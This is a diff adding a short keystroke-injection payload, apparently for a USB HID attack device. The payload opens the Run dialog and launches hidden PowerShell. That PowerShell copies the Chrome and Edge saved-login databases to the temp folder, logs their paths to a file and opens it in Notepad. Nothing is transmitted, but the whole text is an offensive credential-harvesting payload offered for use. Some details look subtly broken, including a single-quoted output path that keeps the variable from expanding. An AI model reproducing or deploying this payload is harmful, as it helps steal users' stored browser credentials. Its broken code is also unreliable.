@@ -1,0 +1,5 @@
+DELAY 1000
+GUI r
+DELAY 600
+STRING powershell -WindowStyle Hidden -Command "& { $out = '$env:TEMP\px_bcreds.txt'; $chromeDb = \"$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data\"; $edgeDb = \"$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data\"; foreach($db in @($chromeDb, $edgeDb)) { if(Test-Path $db) { Copy-Item $db \"$env:TEMP\px_ld_tmp\" -Force; Add-Content $out \"--- $db ---\" } }; Start-Process notepad $out }"
+ENTER
